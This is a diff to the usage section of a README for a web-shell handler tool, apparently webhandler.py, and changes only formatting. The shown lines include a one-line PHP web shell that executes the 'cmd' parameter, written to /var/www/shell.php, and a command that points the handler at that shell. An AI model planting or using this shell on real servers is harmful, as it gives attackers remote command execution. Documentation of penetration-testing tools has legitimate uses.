@@ -23,7 +23,7 @@ It also supports HTTP proxies (proxy http://<ip>:<port>
 ### Usage ###
 ---
 * --Example file
-    - echo '<?php system($_GET['cmd']); ?>' > /var/www/shell.php
+    - `echo '<?php system($_GET['cmd']); ?>' > /var/www/shell.php`
 
 * --url is a required argument when sending either GET or POST requests (e.g. a bind 'web based PHP' connection):
     - python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=
